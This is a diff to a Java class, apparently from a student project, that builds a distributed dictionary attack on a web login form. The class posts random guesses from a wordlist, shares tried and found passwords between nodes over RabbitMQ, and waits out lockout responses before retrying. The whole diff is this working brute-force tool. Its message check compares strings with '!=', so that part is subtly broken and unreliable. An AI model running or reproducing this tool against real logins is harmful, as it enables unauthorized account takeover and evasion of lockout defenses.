@@ -28,6 +28,8 @@ import com.rabbitmq.client.Consumer;
 import com.rabbitmq.client.DefaultConsumer;
 import com.rabbitmq.client.Envelope;
 
+import java.util.concurrent.TimeUnit;
+
 public class Attaccker {
 
 	private List<String> cookies;
@@ -39,7 +41,6 @@ public class Attaccker {
 	private String dictonary;
 	private boolean passwFound;
 	private boolean ban;
-	private boolean attempts;
 
 	private String exName;
 	private ConnectionFactory factory;
@@ -48,9 +49,8 @@ public class Attaccker {
 	// private String message;
 	private String name;
 	private String queueName;
-	private String mexStr;
 
-	private ArrayList<String> indexRecived = new ArrayList<String>(); // indici delle password ricevute da altri client
+	private ArrayList<String> passwordRecieved = new ArrayList<String>(); // indici delle password ricevute da altri client
 
 	private String passwToSend[] = new String[3]; // array che contiene gli indici delle password che verranno mandate
 													// tramite POST
@@ -64,8 +64,7 @@ public class Attaccker {
 		this.dictonary = dictonary;
 		this.passwFound = false;
 		this.ban = false;
-		this.attempts = false;
-
+		
 		this.exName = exName;
 		// this.message = message;
 		this.name = name;
@@ -85,7 +84,7 @@ public class Attaccker {
 	// System.out.println(result);
 
 	public void start() throws Exception {
-
+		
 		// make sure cookies is turn on
 		CookieHandler.setDefault(new CookieManager());
 
@@ -95,36 +94,56 @@ public class Attaccker {
 		// String[] data = readDictonaryAttack(dictonary);
 		ArrayList<String> data = readDictonaryAttack(dictonary);
 
-		passwToSend = setNewPasswToSend(indexRecived, data);
+		for (int i = 0; i < 3; i++)
+			passwToSend[i] = getNewPasswToSend(passwordRecieved, data);
 
-		// 2. Construct above post's content and then send a POST request for
-		// authentication
+		while (getPasswFound() == false) {
 
-		for (int i = 0; i < 3; i++) {
-			String postParams = this.getFormParams(page, "prova", passwToSend[i]);
-			response[i] = this.sendPost(login, postParams);
-		}
-
-		// Qui si deve considerare response[] ed agire di conseguenza.
-		for (int i = 0; i < response.length; i++) {
-			if (response[i] == 200) {
-				// invio indice password ai nodi: index[i] è la password
-				passwFound = true;
+			for (int i = 0; i < 3; i++) {
+				String postParams = this.getFormParams(page, "prova", passwToSend[i]);
+				response[i] = this.sendPost(login, postParams);
 			}
-			if (response[i] == 271) {
-				// 0. invio l'indice provato agli altri nodi
-				// 1. Aggiornare 3 nuovi indici per le password
-				attempts = true;
-			}
-			if (response[i] == 270) {
-				// 0. invio indici provati agli altri nodi
-				// 1. Aggiornare 3 nuovi indici per le password
-				// 2. sleep x secondi prima di ritentare.
-				ban = true;
+
+			// Qui si deve considerare response[] ed agire di conseguenza.
+			for (int i = 0; i < response.length; i++) {
+				if (response[i] == 200) {
+					// password trovata, inviarla! passwToSend[i] è la password
+					sendMessage("OKAY;"+passwToSend[i]);
+					setPasswFound(true);
+				} else if (response[i] == 271) {
+					// 0. inviare password agli altri nodi
+					sendMessage(passwToSend[i]);
+					// 1. Aggiornare la password che ha ritornato errore di autenticazione
+					passwToSend[i] = getNewPasswToSend(passwordRecieved, data);
+				} else if (response[i] == 270) {
+					// 0. invio indici provati agli altri nodi
+					sendMessage(passwToSend[i]);
+					// 1. Aggiornare la password che ha ritornato errore di autenticazione
+					passwToSend[i] = getNewPasswToSend(passwordRecieved, data);
+					ban = true;
+				}
+
+				if (ban) {
+					String postParams = this.getFormParams(page, "prova", "a");
+					int a = 0;
+					do {
+						// sleep x secondi prima di ritentare
+						TimeUnit.SECONDS.sleep(25);
+						a = this.sendPost(login, postParams);
+					} while (a == 270);
+				}
 			}
 		}
 	}
 
+	private boolean getPasswFound() {
+		return this.passwFound;
+	}
+	
+	private void setPasswFound(boolean b) {
+		this.passwFound = b;
+	}
+	
 	private ArrayList<String> readDictonaryAttack(String path) throws IOException {
 
 		String line = "";
@@ -137,25 +156,19 @@ public class Attaccker {
 		bf.close();
 
 		return lines;
-		// return lines.toArray(new String[] {});
-
 	}
 
-	private String[] setNewPasswToSend(ArrayList<String> indexRecived, ArrayList<String> data) {
+	private String getNewPasswToSend(ArrayList<String> passwordRecieved, ArrayList<String> data) {
 
 		Random random = new Random();
-		// data.get(random.nextInt(data.size()));
-		// scelta indici random da dizionario
 
-		String[] passwords = new String[3];
-		for (int i = 0; i < 3; i++) {
+		String passwords = "";
 
-			passwords[i] = data.get(random.nextInt(data.size()));
-			// index[i] = (int) (Math.random() * (data.length));
-			while (indexRecived.contains(passwords[i]))
-				passwords[i] = data.get(random.nextInt(data.size()));
+		do {
 
-		}
+			passwords = data.get(random.nextInt(data.size()));
+
+		} while (passwordRecieved.contains(passwords));
 
 		return passwords;
 	}
@@ -191,7 +204,7 @@ public class Attaccker {
 		wr.close();
 
 		int responseCode = conn.getResponseCode();
-		System.out.println("\nSending 'POST' request to URL : " + url);
+		//System.out.println("\nSending 'POST' request to URL : " + url);
 		System.out.println("Post parameters : " + postParams);
 		System.out.println("Response Code : " + responseCode);
 
@@ -228,8 +241,8 @@ public class Attaccker {
 			}
 		}
 		int responseCode = conn.getResponseCode();
-		System.out.println("\nSending 'GET' request to URL : " + url);
-		System.out.println("Response Code : " + responseCode);
+		//System.out.println("\nSending 'GET' request to URL : " + url);
+		//System.out.println("Response Code : " + responseCode);
 
 		BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
 		String inputLine;
@@ -249,7 +262,7 @@ public class Attaccker {
 
 	private String getFormParams(String html, String username, String password) throws UnsupportedEncodingException {
 
-		System.out.println("Extracting form's data...");
+		//System.out.println("Extracting form's data...");
 
 		Document doc = Jsoup.parse(html);
 
@@ -302,11 +315,16 @@ public class Attaccker {
 					byte[] body) throws IOException {
 				String mexReceived = new String(body, "UTF-8");
 				// System.out.println(name + " Received: " + mexReceived);
-				indexRecived.add(mexReceived);
+				if(mexReceived.split(";")[0] != "OKAY") {
+					passwordRecieved.add(mexReceived);
+				}
+				else {
+					setPasswFound(true);
+					System.out.println("Password Trovata: "+ mexReceived.split(";")[1]);
+				}
 			}
 		};
 
 		this.channel.basicConsume(this.queueName, true, consumer);
 	}
-
 }
